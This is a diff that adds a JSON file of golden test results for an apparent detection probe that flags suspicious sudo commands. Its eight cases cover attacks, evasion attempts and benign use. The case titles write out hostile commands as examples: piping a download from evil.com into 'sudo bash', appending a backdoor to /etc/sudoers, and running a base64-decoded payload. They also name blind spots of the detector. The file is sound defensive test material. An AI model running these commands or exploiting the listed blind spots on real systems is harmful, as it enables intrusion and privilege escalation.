@@ -1,0 +1,257 @@
+{
+  "name": "sudo_suspicious_command",
+  "title": "Suspicious Sudo Command Execution (T1059 / T1548)",
+  "probe_id": "sudo_suspicious_command",
+  "agent": "auth",
+  "mitre_techniques": [
+    "T1059",
+    "T1059.004",
+    "T1548",
+    "T1548.003"
+  ],
+  "mitre_tactics": [
+    "Execution",
+    "Privilege Escalation"
+  ],
+  "total": 8,
+  "passed": 8,
+  "failed": 0,
+  "cases": [
+    {
+      "id": "susp_curl_pipe_bash",
+      "title": "curl http://evil.com | sudo bash \u2192 CRITICAL (pipe_to_shell)",
+      "category": "positive",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 1,
+        "event_types": [
+          "sudo_suspicious_pipe_to_shell"
+        ],
+        "severity": "CRITICAL",
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 1,
+        "events": [
+          {
+            "event_type": "sudo_suspicious_pipe_to_shell",
+            "severity": "CRITICAL",
+            "probe_name": "sudo_suspicious_command",
+            "confidence": 0.8,
+            "mitre_techniques": [
+              "T1548",
+              "T1059"
+            ],
+            "mitre_tactics": [],
+            "tags": [],
+            "data_keys": [
+              "command",
+              "source_ip",
+              "threat_type",
+              "username"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "susp_sudoers_backdoor",
+      "title": "sudo echo backdoor >> /etc/sudoers \u2192 CRITICAL (sudoers_modification)",
+      "category": "positive",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 1,
+        "event_types": [
+          "sudo_suspicious_sudoers_modification"
+        ],
+        "severity": "CRITICAL",
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 1,
+        "events": [
+          {
+            "event_type": "sudo_suspicious_sudoers_modification",
+            "severity": "CRITICAL",
+            "probe_name": "sudo_suspicious_command",
+            "confidence": 0.8,
+            "mitre_techniques": [
+              "T1548",
+              "T1059"
+            ],
+            "mitre_tactics": [],
+            "tags": [],
+            "data_keys": [
+              "command",
+              "source_ip",
+              "threat_type",
+              "username"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "susp_spawn_shell",
+      "title": "sudo bash \u2192 CRITICAL shell spawn",
+      "category": "positive",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 1,
+        "event_types": [
+          "sudo_suspicious_shell_spawn"
+        ],
+        "severity": "HIGH",
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 1,
+        "events": [
+          {
+            "event_type": "sudo_suspicious_shell_spawn",
+            "severity": "HIGH",
+            "probe_name": "sudo_suspicious_command",
+            "confidence": 0.8,
+            "mitre_techniques": [
+              "T1548",
+              "T1059"
+            ],
+            "mitre_tactics": [],
+            "tags": [],
+            "data_keys": [
+              "command",
+              "source_ip",
+              "threat_type",
+              "username"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "susp_evade_base64_obfuscation",
+      "title": "sudo bash -c \"$(echo payload | base64 -d)\" \u2014 partial evasion",
+      "category": "evasion",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 1,
+        "event_types": [
+          "sudo_suspicious_shell_spawn"
+        ],
+        "severity": "HIGH",
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 1,
+        "events": [
+          {
+            "event_type": "sudo_suspicious_shell_spawn",
+            "severity": "HIGH",
+            "probe_name": "sudo_suspicious_command",
+            "confidence": 0.8,
+            "mitre_techniques": [
+              "T1548",
+              "T1059"
+            ],
+            "mitre_tactics": [],
+            "tags": [],
+            "data_keys": [
+              "command",
+              "source_ip",
+              "threat_type",
+              "username"
+            ]
+          }
+        ]
+      }
+    },
+    {
+      "id": "susp_evade_split_commands",
+      "title": "Attacker splits dangerous commands across separate sudo calls",
+      "category": "evasion",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 3,
+      "expect": {
+        "count": 0,
+        "event_types": [],
+        "severity": null,
+        "evades": true
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 0,
+        "events": []
+      }
+    },
+    {
+      "id": "susp_evade_failed_sudo",
+      "title": "Dangerous sudo command that fails (SUDO_DENIED) \u2014 probe only checks SUCCESS",
+      "category": "evasion",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 0,
+        "event_types": [],
+        "severity": null,
+        "evades": true
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 0,
+        "events": []
+      }
+    },
+    {
+      "id": "susp_benign_apt_update",
+      "title": "sudo apt update \u2014 legitimate package management, no fire",
+      "category": "benign",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 0,
+        "event_types": [],
+        "severity": null,
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 0,
+        "events": []
+      }
+    },
+    {
+      "id": "susp_benign_systemctl",
+      "title": "sudo systemctl restart nginx \u2014 routine service restart, no fire",
+      "category": "benign",
+      "stateful": false,
+      "shared_data_key": "auth_events",
+      "input_event_count": 1,
+      "expect": {
+        "count": 0,
+        "event_types": [],
+        "severity": null,
+        "evades": false
+      },
+      "golden": {
+        "passed": true,
+        "event_count": 0,
+        "events": []
+      }
+    }
+  ]
+}
